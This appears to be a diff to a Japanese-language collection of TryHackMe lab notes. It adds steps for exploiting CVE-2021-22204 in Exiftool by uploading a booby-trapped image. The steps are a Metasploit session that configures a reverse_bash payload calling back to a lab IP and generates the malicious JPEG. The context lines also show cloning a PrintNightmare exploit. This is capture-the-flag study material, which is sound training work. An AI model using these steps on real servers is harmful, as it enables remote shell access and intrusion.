@@ -662,3 +662,20 @@ https://tryhackme.com/room/printnightmarehpzqlp8
 ```sh
 git clone https://github.com/tryhackme/CVE-2021-1675.git 
 ```
+
+## CVE-2021-22204 (Exiftool)
+
+https://tryhackme.com/room/dejavu
+
+サーバーでExiftoolが実行されるとして、画像ファイルをアップロードする。
+
+```sh
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set LHOST 10.11.146.32
+LHOST => 10.11.146.32
+
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set PAYLOAD cmd/unix/reverse_bash
+PAYLOAD => cmd/unix/reverse_bash
+
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
+[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
+```
